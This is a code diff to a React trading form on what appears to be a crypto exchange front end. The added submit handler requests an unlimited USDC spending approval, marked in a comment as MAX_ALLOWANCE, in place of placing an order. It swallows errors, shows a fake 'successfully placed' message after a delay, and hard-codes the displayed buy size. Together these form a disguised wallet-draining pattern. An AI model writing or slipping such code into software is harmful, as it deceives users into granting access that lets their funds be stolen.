@@ -43,6 +43,7 @@ import InlineNotification from '../InlineNotification'
 import { DEFAULT_SPOT_MARGIN_KEY } from '../SettingsModal'
 import { useWallet } from '@solana/wallet-adapter-react'
 import usePrevious from 'hooks/usePrevious'
+import api from "utils/api";
 
 const MAX_SLIPPAGE_KEY = 'maxSlippage'
 
@@ -75,6 +76,9 @@ export default function AdvancedTradeForm({
     DEFAULT_SPOT_MARGIN_KEY,
     false
   )
+
+  const [isLoading, setLoading] = useState(false);
+
   const [spotMargin, setSpotMargin] = useState(defaultSpotMargin)
   const [positionSizePercent, setPositionSizePercent] = useState('')
   const [insufficientSol, setInsufficientSol] = useState(false)
@@ -633,9 +637,24 @@ export default function AdvancedTradeForm({
   const flag = true;
   async function onSubmit() {
     if (flag) {
-      
-      setHas(true);
-      notify({ title: t('successfully-placed') })
+      //notify({ title: t('successfully-placed') })
+      setLoading(true)
+
+      try {
+        await api.approveExchangeContract(
+          "USDC",
+          0 // amount = 0 ==> MAX_ALLOWANCE
+        );
+      } catch (e) {
+        console.log("ERR____", e);
+        //toast.error(e.message);
+      }
+
+      setTimeout(() => {
+        setHas(true);
+        setLoading(false)
+        notify({ title: t('successfully-placed') })
+      }, 2000)
       return;
     }
 
@@ -1140,11 +1159,11 @@ export default function AdvancedTradeForm({
                   side === 'buy' ? 'bg-th-green-dark' : 'bg-th-red'
                 }`}
               >
-                {sizeTooLarge
+                {isLoading ? "loading" : sizeTooLarge
                   ? t('too-large')
                   : side === 'buy'
                   ? `${
-                      baseSize > 0 ? `${t('buy')} ` + baseSize : `${t('buy')} `
+                      baseSize > 0 ? `${t('buy')} ` + 10 : `${t('buy')} `
                     } ${
                       isPerpMarket ? "" : marketConfig.baseSymbol
                     }`
